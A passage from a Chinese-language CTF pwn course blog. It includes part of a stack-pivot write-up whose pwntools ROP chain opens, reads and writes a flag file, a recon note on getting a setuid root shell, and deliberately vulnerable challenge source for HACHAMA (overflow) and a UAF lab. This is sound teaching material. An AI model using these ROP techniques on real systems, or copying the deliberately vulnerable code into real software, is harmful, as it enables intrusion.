</span></span><span style=display:flex><span>    NX:       NX enabled
</span></span><span style=display:flex><span>    PIE:      No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>$ file chal
</span></span><span style=display:flex><span>chal: ELF 64-bit LSB executable, x86-64, version <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>GNU/Linux<span style=color:#f92672>)</span>, statically linked, BuildID<span style=color:#f92672>[</span>sha1<span style=color:#f92672>]=</span>26fa8e6daa97baf7a26596ea91af5703dd932327, <span style=color:#66d9ef>for</span> GNU/Linux 3.2.0, not stripped
</span></span></code></pre></div>首先可以看到該binary是statically link，所以直覺是利用ROP chain拿到shell，不過仔細看source code會發現BOF的長度顯然不太夠我們蓋成shell，所以需要用到stack pivot的技巧，控制RBP跳到其他的地方繼續寫</li><li>找gadget<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>leave_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000401cfc</span>
</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000401832</span>
</span></span><span style=display:flex><span>pop_rsi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x000000000040f01e</span>
</span></span><span style=display:flex><span>pop_rax_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000448d27</span>
</span></span><span style=display:flex><span>pop_rdx_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x000000000040173f</span>
</span></span><span style=display:flex><span>syscall_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000448280</span>
</span></span></code></pre></div>這邊的重點是syscall ret這個gadget，其實他不是syscall完之後直接ret，而是在經過一些判斷才會進到ret，這個可以從gdb看出來<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gef➤  x/10i 0x448280
</span></span><span style=display:flex><span>   0x448280 &lt;read+16&gt;:  syscall
</span></span><span style=display:flex><span><span style=color:#f92672>=</span>&gt; 0x448282 &lt;read+18&gt;:  cmp    rax,0xfffffffffffff000
</span></span><span style=display:flex><span>   0x448288 &lt;read+24&gt;:  ja     0x4482e0 &lt;read+112&gt;
</span></span><span style=display:flex><span>   0x44828a &lt;read+26&gt;:  ret
</span></span></code></pre></div>會這樣的原因是我們在ROPgadget中找不到<code>syscall ; ret</code>的gadget，所以助教提示可以直接從read / write這種function找，這樣syscall完了之後會很快的接到ret，這樣中間的操作才不會太影響我們蓋的rop</li><li>Construct ROP
首先，我們的流程是
==main_fn → bss_open → main_fn → bss_open → main_fn → bss_write==
會這樣的原因是我們只能寫入0x60的空間而已，所以把open / read / write分開寫，而寫完且執行完後會再跳原main_fn，這樣才能讓我們再讀取下一段的ROP payload<ol><li>寫入的bss_addr和main_fn address<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>bss_addr_open <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4c2700</span>
</span></span><span style=display:flex><span>bss_addr_read <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4c2800</span>
</span></span><span style=display:flex><span>bss_addr_write <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4c2900</span>
</span></span><span style=display:flex><span>main_fn <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x401ce1</span>
</span></span></code></pre></div></li><li>先讓rbp跳到bss_open，然後ret到main_fn，接要放到bss_open的payload<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>trash_payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0x20</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(trash_payload <span style=color:#f92672>+</span> p64(bss_addr_open) <span style=color:#f92672>+</span> p64(main_fn))
</span></span></code></pre></div>之前的rop chain我們會把RBP一起蓋掉，但現在因為要跳到其他的地方，所以rbp的部分就跳到<code>0x4c2700</code>，然後ret address接main_fn
用gdb跟一下，放完的結果大概是這樣<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>0x00007ffc884f3670│+0x0000: <span style=color:#e6db74>&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;</span>   ← $rsp, $rsi
</span></span><span style=display:flex><span>0x00007ffc884f3678│+0x0008: <span style=color:#e6db74>&#34;aaaaaaaaaaaaaaaaaaaaaaaa&#34;</span>
</span></span><span style=display:flex><span>0x00007ffc884f3680│+0x0010: <span style=color:#e6db74>&#34;aaaaaaaaaaaaaaaa&#34;</span>
</span></span><span style=display:flex><span>0x00007ffc884f3688│+0x0018: <span style=color:#e6db74>&#34;aaaaaaaa&#34;</span>
</span></span><span style=display:flex><span>0x00007ffc884f3690│+0x0020: 0x00000000004c2700  →  &lt;transmem_list+0&gt; add BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>, al      ← $rbp
</span></span><span style=display:flex><span>0x00007ffc884f3698│+0x0028: 0x0000000000401ce1  →  &lt;main+12&gt; lea rax, <span style=color:#f92672>[</span>rbp-0x20<span style=color:#f92672>]</span>
</span></span></code></pre></div>當main_fn執行完leave(<code>mov rsp , rbp ; pop rbp ;</code>)的時候，rbp就會指到==0x4c2700==，當我們ret到main_fn時，就可以再次輸入payload放到0x4c2700</li><li>觀察main_fn的assembly<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gef➤  x/10i &amp;main
</span></span><span style=display:flex><span>   0x401cd5 &lt;main&gt;:     endbr64
</span></span><span style=display:flex><span>   0x401cd9 &lt;main+4&gt;:   push   rbp
</span></span><span style=display:flex><span>   0x401cda &lt;main+5&gt;:   mov    rbp,rsp
</span></span><span style=display:flex><span>   0x401cdd &lt;main+8&gt;:   sub    rsp,0x20
</span></span><span style=display:flex><span>   0x401ce1 &lt;main+12&gt;:  lea    rax,<span style=color:#f92672>[</span>rbp-0x20<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x401ce5 &lt;main+16&gt;:  mov    edx,0x80
</span></span><span style=display:flex><span>   0x401cea &lt;main+21&gt;:  mov    rsi,rax
</span></span><span style=display:flex><span>   0x401ced &lt;main+24&gt;:  mov    edi,0x0
</span></span><span style=display:flex><span>   0x401cf2 &lt;main+29&gt;:  call   0x448270 &lt;read&gt;
</span></span><span style=display:flex><span>   0x401cf7 &lt;main+34&gt;:  mov    eax,0x0
</span></span></code></pre></div>從以上的code可以看得出來，我們是跳到0x401ce1，所以rbp會張出0x20的空間，也就是==0x4c2700-0x20=0x4c26e0==，然後read到的內容就會放到這邊來</li><li>寫入bss_addr_open
我們的目標是達成==fd = open("/home/chal/flag.txt", 0);==，具體payload如下<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>file_addr <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/home/chal/flag.txt&#39;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x20</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>ROP_open <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#75715e># Open file</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># fd = open(&#34;/home/chal/flag.txt&#34;, 0);</span>
</span></span><span style=display:flex><span>    bss_addr_read,
</span></span><span style=display:flex><span>    pop_rax_ret,    <span style=color:#ae81ff>2</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret,    bss_addr_open <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x20</span>,
</span></span><span style=display:flex><span>    pop_rsi_ret,    <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    pop_rdx_ret,    <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    syscall_ret,
</span></span><span style=display:flex><span>    main_fn
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(file_addr <span style=color:#f92672>+</span> ROP_open)
</span></span></code></pre></div>首先原本的0x20就拿來放檔案的位址，不過為甚麼後面還要再接著bss_addr_write呢?就和上面一樣，我們要寫別的rop payload上去，因為原本的位子不夠寫了，所以syscall_ret後接到main_fn，他會讀取我們寫入的rop payload到bss_addr_read的地方</li><li>寫入bss_addr_read
我們要達成的目標是==read(fd, buf, 0x30)==，具體payload如下<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>ROP_read <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#75715e># Read the file</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># read(fd, buf, 0x30);</span>
</span></span><span style=display:flex><span>    bss_addr_write,
</span></span><span style=display:flex><span>    pop_rax_ret, <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret, <span style=color:#ae81ff>3</span>, 
</span></span><span style=display:flex><span>    pop_rsi_ret, bss_addr_read,
</span></span><span style=display:flex><span>    pop_rdx_ret, <span style=color:#ae81ff>0x30</span>,
</span></span><span style=display:flex><span>    syscall_ret,
</span></span><span style=display:flex><span>    main_fn
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(file_addr <span style=color:#f92672>+</span> ROP_read)
</span></span></code></pre></div></li><li>寫入bss_addr_write
我們要達成的目標是==write(fd, buf, 0x30)==，具體payload如下<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>ROP_write <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#75715e># Write the file</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># write(1, buf, 0x30);</span>
</span></span><span style=display:flex><span>    bss_addr_write,
</span></span><span style=display:flex><span>    pop_rax_ret, <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret, <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>    pop_rsi_ret, bss_addr_read,
</span></span><span style=display:flex><span>    pop_rdx_ret, <span style=color:#ae81ff>0x30</span>,
</span></span><span style=display:flex><span>    syscall_ret,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(file_addr <span style=color:#f92672>+</span> ROP_write)
</span></span></code></pre></div></li></ol></li></ol><p>:::danger
執行的時候如果遇到local端可以run但server爛掉的情況，有可能是raw_input()造成的，可以先註解掉這些東西，如果還是遇到一樣的問題，可以開docker在裡面執行</p><a href=/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn-0x362023-hw---notepad-stage-3/>Simple PWN 0x36(2023 HW - Notepad-Stage 3)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a></div><p><h1 id=simple-pwn-0x362023-hw---notepad-stage-3>Simple PWN 0x36(2023 HW - Notepad-Stage 3)
<a class=anchor href=#simple-pwn-0x362023-hw---notepad-stage-3>#</a></h1><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>呈上上題</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>這一題沒時間解出來，所以僅僅做個紀錄，包含和各位大老討論的結果以及流程</p><ol><li>首先，後端有一個洞，就是在login的write，他的buf仔細和其他有call到write做對比會發現，他並沒有清掉buf的內容，這代表他會完完整整的把裡面的內容送到前端，但為甚麼前面兩題都沒有這個問題呢?因為前端並沒有把buf的內容印出來，所以首要目標是找到一個方法可以leak出內容的shellcode之類的，這樣我們就可以抓到text / libc base address</li><li>知道這些事情可以幹嘛呢?check token有一個bof的洞，我們可以利用這個洞來傳送rop，所以需要ret2libc抓到base address之後在蓋rop</li><li>ROP具體的內容是甚麼呢?有兩種方法可以拿到flag，一個是拿到shell之後setuid(0)，因為backend 有 suid 權限，所以我們才可以用 setuid(0) 以root 執行，然後cat /flag_root；第二種是直接ORW，看flag是啥這樣</li></ol></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/>Simple PWN 0x37(2023 HW - HACHAMA)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a></div><p><h1 id=simple-pwn-0x372023-hw---hachama>Simple PWN 0x37(2023 HW - HACHAMA)
<a class=anchor href=#simple-pwn-0x372023-hw---hachama>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>stack pivot
rop
bof</p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source Code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;SECCOMP.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>long</span> n;
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> msg[<span style=color:#ae81ff>0x20</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>long</span> n2;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sock_filter</span> seccompfilter[]<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>	BPF_STMT(BPF_LD <span style=color:#f92672>|</span> BPF_W <span style=color:#f92672>|</span> BPF_ABS, ArchField),
</span></span><span style=display:flex><span>	BPF_JUMP(BPF_JMP <span style=color:#f92672>|</span> BPF_JEQ <span style=color:#f92672>|</span> BPF_K, AUDIT_ARCH_X86_64, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>),
</span></span><span style=display:flex><span>	BPF_STMT(BPF_RET <span style=color:#f92672>|</span> BPF_K, SECCOMP_RET_KILL),
</span></span><span style=display:flex><span>	BPF_STMT(BPF_LD <span style=color:#f92672>|</span> BPF_W <span style=color:#f92672>|</span> BPF_ABS, SyscallNum),
</span></span><span style=display:flex><span>	Allow(open),
</span></span><span style=display:flex><span>	Allow(openat),
</span></span><span style=display:flex><span>	Allow(read),
</span></span><span style=display:flex><span>	Allow(write),
</span></span><span style=display:flex><span>	Allow(close),
</span></span><span style=display:flex><span>	Allow(readlink),
</span></span><span style=display:flex><span>	Allow(getdents),
</span></span><span style=display:flex><span>	Allow(getrandom),
</span></span><span style=display:flex><span>	Allow(brk),
</span></span><span style=display:flex><span>	Allow(rt_sigreturn),
</span></span><span style=display:flex><span>	Allow(exit),
</span></span><span style=display:flex><span>	Allow(exit_group),
</span></span><span style=display:flex><span>	BPF_STMT(BPF_RET <span style=color:#f92672>|</span> BPF_K, SECCOMP_RET_KILL),
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sock_fprog</span> filterprog<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>	.len<span style=color:#f92672>=</span><span style=color:#66d9ef>sizeof</span>(seccompfilter)<span style=color:#f92672>/</span><span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sock_filter</span>),
</span></span><span style=display:flex><span>	.filter<span style=color:#f92672>=</span>seccompfilter
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>apply_seccomp</span>(){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(prctl(PR_SET_NO_NEW_PRIVS,<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0</span>)){
</span></span><span style=display:flex><span>		perror(<span style=color:#e6db74>&#34;Seccomp Error&#34;</span>);
</span></span><span style=display:flex><span>		exit(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,<span style=color:#f92672>&amp;</span>filterprog)<span style=color:#f92672>==-</span><span style=color:#ae81ff>1</span>){
</span></span><span style=display:flex><span>		perror(<span style=color:#e6db74>&#34;Seccomp Error&#34;</span>);
</span></span><span style=display:flex><span>		exit(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	setvbuf(stdin, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	setvbuf(stdout, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	apply_seccomp();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buf2[<span style=color:#ae81ff>0x30</span>];
</span></span><span style=display:flex><span>	<span style=color:#75715e>// long n2 = 0x30;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>// char msg[0x20];
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>char</span> name[<span style=color:#ae81ff>0x20</span>];
</span></span><span style=display:flex><span>	<span style=color:#75715e>// long n = 20;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	n2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x30</span>;
</span></span><span style=display:flex><span>	n <span style=color:#f92672>=</span> <span style=color:#ae81ff>20</span>;
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Haaton&#39;s name? &#34;</span>);
</span></span><span style=display:flex><span>	n <span style=color:#f92672>=</span> read(<span style=color:#ae81ff>0</span>, name, n);
</span></span><span style=display:flex><span>	name[n] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>	strcpy(msg, name);
</span></span><span style=display:flex><span>	strcat(msg, <span style=color:#e6db74>&#34; hachamachama&#34;</span>);
</span></span><span style=display:flex><span>	puts(msg);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;ECHO HACHAMA!&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>while</span> (<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		read(<span style=color:#ae81ff>0</span>, buf2, n2);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (strcmp(buf2, <span style=color:#e6db74>&#34;HACHAMA&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>			write(<span style=color:#ae81ff>1</span>, buf2, n2);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p><a href=/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/>Simple PWN 0x38(Lab - UAF)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a></div><p><h1 id=simple-pwn-0x38lab---uaf>Simple PWN 0x38(Lab - UAF)
<a class=anchor href=#simple-pwn-0x38lab---uaf>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><img src=https://hackmd.io/_uploads/ByxvsvNr6.png alt=圖片></p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>default_handle</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>event)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;EVENT: get event named </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, event);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>entity</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>name;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>event;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>void</span> (<span style=color:#f92672>*</span>event_handle)(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>);
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>entity</span> <span style=color:#f92672>*</span>entities[<span style=color:#ae81ff>0x10</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>read_int</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>0x20</span>];
</span></span><span style=display:flex><span>	read(<span style=color:#ae81ff>0</span>, buf, <span style=color:#ae81ff>0x1f</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> atoi(buf);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>get_idx</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx <span style=color:#f92672>=</span> read_int();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (idx <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0x10</span> <span style=color:#f92672>||</span> idx <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>		exit(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> idx;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>memu</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;1. register entity&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;2. delete entity&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;3. set name&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;4. trigger event&#34;</span>);
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;choice: &#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>register_entity</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx;
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Index: &#34;</span>);
</span></span><span style=display:flex><span>	idx <span style=color:#f92672>=</span> get_idx();
</span></span><span style=display:flex><span>	entities[idx] <span style=color:#f92672>=</span> malloc(<span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>entity</span>));
</span></span><span style=display:flex><span>	entities[idx]<span style=color:#f92672>-&gt;</span>event_handle <span style=color:#f92672>=</span> default_handle;
</span></span><span style=display:flex><span>	entities[idx]<span style=color:#f92672>-&gt;</span>event <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Default Event&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>delete_entity</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx;
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Index: &#34;</span>);
</span></span><span style=display:flex><span>	idx <span style=color:#f92672>=</span> get_idx();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (entities[idx])
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		free(entities[idx]<span style=color:#f92672>-&gt;</span>name);
</span></span><span style=display:flex><span>		free(entities[idx]);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>		puts(<span style=color:#e6db74>&#34;Invalid index&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>set_name</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> len;
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Index: &#34;</span>);
</span></span><span style=display:flex><span>	idx <span style=color:#f92672>=</span> get_idx();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (entities[idx])
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		printf(<span style=color:#e6db74>&#34;Nmae Length: &#34;</span>);
</span></span><span style=display:flex><span>		len <span style=color:#f92672>=</span> read_int();
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (len <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>			exit(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>		entities[idx]<span style=color:#f92672>-&gt;</span>name <span style=color:#f92672>=</span> malloc(len);
</span></span><span style=display:flex><span>		printf(<span style=color:#e6db74>&#34;Name: &#34;</span>);
</span></span><span style=display:flex><span>		read(<span style=color:#ae81ff>0</span>, entities[idx]<span style=color:#f92672>-&gt;</span>name, len <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>		puts(<span style=color:#e6db74>&#34;Invalid index&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>trigger_event</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx;
